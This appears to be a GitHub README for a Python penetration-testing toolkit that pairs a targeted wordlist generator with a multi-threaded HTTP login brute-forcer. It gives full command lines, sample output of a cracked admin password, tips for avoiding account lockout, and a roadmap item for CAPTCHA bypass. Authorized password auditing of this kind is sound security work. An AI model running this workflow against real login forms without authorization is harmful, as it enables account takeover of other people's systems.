<div align="center">

<img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&pause=1000&color=00FF41&background=000000&center=true&vCenter=true&width=700&lines=WordForge+%2B+BruteForge+%F0%9F%94%A8;Wordlist+Generator+%2B+HTTP+Login+Tester;Kali+Linux+%7C+Python+3;Ethical+Hacking+Toolkit" alt="Typing SVG" />

# SecurityForge Toolkit

**A complete Python penetration testing toolkit for Kali Linux:**
**generate smart wordlists → brute-force HTTP login forms — all in one workflow.**

[![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Kali Linux](https://img.shields.io/badge/Kali_Linux-Compatible-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)](https://kali.org)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
[![Tools](https://img.shields.io/badge/Tools-2-orange?style=for-the-badge)](#tools)
[![Ethical](https://img.shields.io/badge/Use-Ethical%20Hacking%20Only-red?style=for-the-badge)](#legal-disclaimer)

</div>

---

## Overview

This toolkit contains two tools that work together as a complete attack chain for **authorized** password auditing:

```
[WordForge]  keywords → smart wordlist (.txt)
                ↓
[BruteForge] wordlist + URL → tries every password → finds correct one
```

---

## Tools

### 1. WordForge — Wordlist Generator (`wordlist_generator.py`)

Transforms a few keywords into a **large, intelligent wordlist** by applying:

| Technique | Example |
|---|---|
| Capitalization variants | `ahmed` → `AHMED`, `Ahmed`, `aHMED` |
| Leet Speak | `ahmed` → `4hm3d`, `4hm3d!` |
| Keyword combinations | `ahmed_cairo`, `cairo-1995`, `1995@ahmed` |
| Numeric suffixes | `ahmed123`, `ahmed2024`, `ahmed007` |
| Special character suffixes | `ahmed!`, `ahmed@`, `ahmed#$` |
| Common prefixes | `adminahmed`, `rootahmed`, `userahmed` |

**Result:** 3 keywords → **34,000+ passwords** in seconds.

---

### 2. BruteForge — HTTP Login Brute Forcer (`bruteforge.py`)

Takes the wordlist from WordForge and tries each password against an HTTP login form until the correct one is found.

**Features:**
- Multi-threaded (configurable speed)
- Auto-detects success/failure by response text
- Supports any POST-based login form
- Burp Suite proxy support (intercept traffic)
- Saves found credentials to a file
- Interactive mode + full CLI flags
- Rate limiting / delay to avoid lockout

---

## Installation

```bash
# Clone the repository
git clone https://github.com/MR-SHANKAR7/profile.git
cd profile

# Install the only dependency (for BruteForge)
pip install requests

# Make scripts executable
chmod +x wordlist_generator.py bruteforge.py
```

**Requirements:**
- Python 3.8+
- `requests` library (only for BruteForge)
- Kali Linux / any Linux / macOS / WSL

---

## Full Workflow Example

### Step 1 — Generate Wordlist with WordForge

```bash
python3 wordlist_generator.py
```

```
Enter keywords separated by commas or spaces:
>>> admin, 2024, company

[*] Expanding individual keywords...      10 words
[*] Combining keyword pairs...            82 words
[*] Applying numeric/special affixes...   44,608 words
[*] Filtering 4 ≤ length ≤ 20 ...
[+] Saved 34,156 words → wordlist_admin_2024_company_20250101.txt
```

### Step 2 — Brute Force Login with BruteForge

```bash
python3 bruteforge.py \
  --url http://192.168.1.100/login \
  --user admin \
  --wordlist wordlist_admin_2024_company_20250101.txt \
  --user-field username \
  --pass-field password \
  --fail-text "Invalid credentials" \
  --threads 10
```

```
  [*] Target  : http://192.168.1.100/login
  [*] Username: admin
  [*] Wordlist: 34,156 passwords loaded
  [*] Threads : 10

  [   142] Trying: admin2024!         18.3 pwd/s  |  34014 left

  ╔══════════════════════════════════════════════════════╗
  ║  [+] PASSWORD FOUND!                                 ║
  ║  Username : admin                                    ║
  ║  Password : admin2024!                               ║
  ╚══════════════════════════════════════════════════════╝

  [+] Result saved to: found_admin_20250101_120348.txt
```

---

## BruteForge — Detailed Usage

### Interactive Mode (Recommended for beginners)

```bash
python3 bruteforge.py
```

You will be guided through:
1. Target URL
2. Username
3. Wordlist file path
4. HTML form field names (inspect page source)
5. Failure text (what appears when login fails)
6. Thread count and delay

### CLI Mode (For scripting / automation)

```bash
python3 bruteforge.py [options]

Options:
  --url           Target login URL
  --user          Username to test
  --wordlist      Path to wordlist file
  --user-field    HTML input name for username  [default: username]
  --pass-field    HTML input name for password  [default: password]
  --fail-text     Text on page when login fails (e.g. "Invalid")
  --success-text  Text on page when login succeeds (e.g. "Welcome")
  --threads       Number of parallel threads    [default: 5]
  --delay         Seconds to wait between requests [default: 0]
  --timeout       Request timeout in seconds    [default: 10]
  --proxy         Proxy URL (e.g. http://127.0.0.1:8080 for Burp)
```

### How to Find Form Field Names

Open the login page, right-click → **Inspect Element**, look for:

```html
<form method="POST" action="/login">
  <input type="text"     name="username">   ← use this as --user-field
  <input type="password" name="password">   ← use this as --pass-field
  <input type="submit"   value="Login">
</form>
```

---

## How BruteForge Works — Pipeline

```
Wordlist File
      │
      ▼
 ┌─────────────────────────────┐
 │  Load all passwords into    │
 │  a thread-safe queue        │
 └──────────┬──────────────────┘
            │
      ┌─────┴─────┐
   Thread 1   Thread N   (parallel workers)
      │           │
      ▼           ▼
 ┌─────────────────────────────┐
 │  POST request to login URL  │
 │  with current password      │
 └──────────┬──────────────────┘
            │
      ┌─────┴──────────────────┐
      │  Check response text   │
      │  for fail/success text │
      └─────┬──────────────────┘
            │
     ┌──────┴──────┐
   FAIL           SUCCESS
     │               │
  Next word     Print result
                Save to file
                Stop all threads
```

---

## WordForge — Keyword Tips

| Category | Examples |
|---|---|
| Target name | `john`, `admin`, `support` |
| Birth year / date | `1990`, `2001`, `0615` |
| City / country | `london`, `cairo`, `ksa` |
| Company name | `google`, `corp`, `company` |
| Common patterns | `password`, `secure`, `login`, `welcome` |
| Pets / hobbies | `football`, `cat`, `music` |

> More targeted keywords = fewer attempts needed = faster results.

---

## Performance

### WordForge

| Keywords | Words Generated | File Size |
|---|---|---|
| 2 keywords | ~8,000 | ~120 KB |
| 3 keywords | ~34,000 | ~530 KB |
| 5 keywords | ~150,000 | ~2.5 MB |

### BruteForge

| Threads | Speed (local network) |
|---|---|
| 1 thread | ~5 req/s |
| 5 threads | ~25 req/s |
| 10 threads | ~50 req/s |
| 20 threads | ~90 req/s |

> Speed depends on the target server's response time and your network.

---

## Tips for Better Results

**Avoid account lockout:**
```bash
# Add delay between requests
python3 bruteforge.py --delay 1.5 ...
```

**Use Burp Suite as proxy to inspect traffic:**
```bash
python3 bruteforge.py --proxy http://127.0.0.1:8080 ...
```

**Pipe WordForge output directly to BruteForge:**
```bash
# Generate + attack in one line
python3 wordlist_generator.py target 1995 city && \
python3 bruteforge.py --url http://target/login --user admin \
  --wordlist wordlist_target_*.txt --fail-text "Wrong password" --threads 5
```

---

## Legal Disclaimer

> **This toolkit is intended exclusively for:**
> - Authorized penetration testing engagements
> - CTF (Capture The Flag) competitions
> - Web application security auditing on systems you own
> - Educational and research purposes
>
> **Using these tools against systems without explicit written authorization is illegal under computer crime laws in most countries.**
>
> The author assumes no liability for any misuse or damage caused by this toolkit. Always get written permission before testing.

---

## Contributing

Pull requests are welcome! Roadmap ideas:

- [ ] CSRF token auto-extraction (handle modern login forms)
- [ ] JSON body support (for REST API logins)
- [ ] Cookie / session-based authentication
- [ ] Support for CAPTCHA detection and bypass via 2captcha
- [ ] Resume interrupted sessions
- [ ] Export results to JSON / CSV

---

## Author

**MR-SHANKAR7**
- GitHub: [@MR-SHANKAR7](https://github.com/MR-SHANKAR7)

---

<div align="center">

**Found this useful? Give it a ⭐ to help others discover it!**

*Built for the security community with ❤️*

</div>
